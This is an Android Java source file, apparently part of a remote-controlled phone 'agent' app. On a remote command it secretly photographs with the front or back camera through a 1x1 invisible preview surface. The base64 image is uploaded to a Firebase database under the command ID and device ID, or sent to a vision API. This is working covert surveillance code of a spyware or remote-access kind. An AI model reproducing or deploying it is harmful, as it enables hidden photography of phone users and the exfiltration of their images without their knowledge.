package com.aiphone.agent.ui;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.ViewGroup;

import androidx.annotation.NonNull;

import com.aiphone.agent.models.Response;
import com.aiphone.agent.utils.DeviceUtils;
import com.google.firebase.database.FirebaseDatabase;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraActivity extends Activity {

    private static final String TAG = "CameraActivity";
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private String commandId;
    private String cameraType;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        commandId = getIntent().getStringExtra("commandId");
        cameraType = getIntent().getStringExtra("camera_type");
        final String actionType = getIntent().getStringExtra("action_type"); // "firebase" or "vision"

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendErrorAndFinish("Camera permission not granted");
            return;
        }

        // Create a hidden surface view for camera preview
        SurfaceView surfaceView = new SurfaceView(this);
        setContentView(surfaceView, new ViewGroup.LayoutParams(1, 1)); // tiny invisible size
        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder holder) {
                startBackgroundThread();
                openCamera(holder.getSurface());
            }

            @Override
            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {
                stopBackgroundThread();
            }
        });
    }

    private void openCamera(Surface surface) {
        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = manager.getCameraIdList()[0];
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if ("front".equalsIgnoreCase(cameraType) && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        cameraId = id;
                        break;
                    } else if (!"front".equalsIgnoreCase(cameraType) && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        cameraId = id;
                        break;
                    }
                }
            }
            
            imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.capacity()];
                    buffer.get(bytes);
                    processImage(bytes);
                } catch (Exception e) {
                    sendErrorAndFinish("Failed to process image: " + e.getMessage());
                } finally {
                    if (image != null) image.close();
                }
            }, backgroundHandler);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    takePicture(surface);
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    sendErrorAndFinish("Camera error: " + error);
                }
            }, backgroundHandler);
        } catch (CameraAccessException | SecurityException e) {
            sendErrorAndFinish("Camera access exception: " + e.getMessage());
        }
    }

    private void takePicture(Surface surface) {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());

            cameraDevice.createCaptureSession(Collections.singletonList(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.capture(builder.build(), null, backgroundHandler);
                    } catch (CameraAccessException e) {
                        sendErrorAndFinish("Failed capture: " + e.getMessage());
                    }
                }

                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                    sendErrorAndFinish("Session configuration failed");
                }
            }, backgroundHandler);

        } catch (CameraAccessException e) {
            sendErrorAndFinish("Capture request failed: " + e.getMessage());
        }
    }

    private void processImage(byte[] bytes) {
        // Compress and rotate image
        Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
        
        // The camera sensor might be rotated 90 degrees
        Matrix matrix = new Matrix();
        matrix.postRotate(90);
        Bitmap rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 20, baos); // Highly compress to save RTDB space
        byte[] compressedBytes = baos.toByteArray();
        String base64Image = Base64.encodeToString(compressedBytes, Base64.DEFAULT);

        String actionType = getIntent().getStringExtra("action_type");
        if ("vision".equals(actionType)) {
            // Local vision API call
            String apiKey = com.aiphone.agent.utils.SecurePrefsManager.getApiKey(this);
            String prompt = getIntent().getStringExtra("vision_prompt");
            if (prompt == null || prompt.isEmpty()) prompt = "Describe what you see in this image briefly.";
            
            com.aiphone.agent.utils.GroqAgent.processVisionCommand(this, prompt, base64Image, apiKey);
            finishActivity();
        } else {
            // Send to Firebase
            Response response = new Response();
            response.commandId = commandId;
            response.targetDeviceId = DeviceUtils.getDeviceId(this);
            response.action = "take_picture";
            response.status = "success";
            response.message = base64Image;
            response.timestamp = System.currentTimeMillis();

            FirebaseDatabase.getInstance().getReference("responses")
                    .child(commandId)
                    .setValue(response)
                    .addOnCompleteListener(task -> {
                        finishActivity();
                    });
        }
    }

    private void sendErrorAndFinish(String errorMsg) {
        Log.e(TAG, errorMsg);
        if (commandId != null) {
            Response response = new Response();
            response.commandId = commandId;
            response.targetDeviceId = DeviceUtils.getDeviceId(this);
            response.action = "take_picture";
            response.status = "error";
            response.error = errorMsg;
            response.timestamp = System.currentTimeMillis();

            FirebaseDatabase.getInstance().getReference("responses")
                    .child(commandId)
                    .setValue(response);
        }
        finishActivity();
    }

    private void finishActivity() {
        if (cameraDevice != null) {
            cameraDevice.close();
        }
        finish();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
